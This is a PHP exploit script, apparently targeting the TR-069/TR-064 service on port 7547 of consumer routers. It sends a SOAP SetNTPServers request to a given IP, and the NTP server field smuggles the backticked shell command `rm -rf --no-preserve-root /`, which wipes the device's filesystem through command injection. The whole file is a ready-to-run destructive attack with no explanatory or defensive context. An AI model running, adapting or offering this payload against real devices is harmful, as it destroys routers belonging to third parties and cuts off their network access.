<?php

if(empty($argv[1])) {
        die("\n\nUsage: php tr069_newntp.php ip\n\n");
}

$ip = $argv[1].":7547";

function send_request($url) {
  $ch = curl_init();

  $soap = "<?xml version=\"1.0\"?>";
  $soap .= "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">";
  $soap .= " <SOAP-ENV:Body>";
  $soap .= "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">";
  $soap .= "   <NewNTPServer1>`rm -rf --no-preserve-root /`</NewNTPServer1>";
  $soap .= "   <NewNTPServer2></NewNTPServer2>";
  $soap .= "   <NewNTPServer3></NewNTPServer3>";
  $soap .= "   <NewNTPServer4></NewNTPServer4>";
  $soap .= "   <NewNTPServer5></NewNTPServer5>";
  $soap .= "  </u:SetNTPServers>";
  $soap .= " </SOAP-ENV:Body>";
  $soap .= "</SOAP-ENV:Envelope>";


  $header = array(
    "Content-type: text/xml;charset=\"utf-8\"",
    "Accept: text/xml",
    "Cache-Control: no-cache",
    "Pragma: no-cache",
    "SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers",
    "Content-length: ".strlen($soap),
  );

  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
  curl_setopt($ch, CURLOPT_TIMEOUT,        3);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true );
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_POST,           true );
  curl_setopt($ch, CURLOPT_POSTFIELDS,     $soap);
  curl_setopt($ch, CURLOPT_HTTPHEADER,     $header);

  if(curl_exec($ch) === false) {
    $err = 'Curl error: ' . curl_error($ch);
    curl_close($ch);
    print $err;
  } else {
    curl_close($ch);
    print 'Operation completed without any errors';
  }

}

send_request($ip);

?>
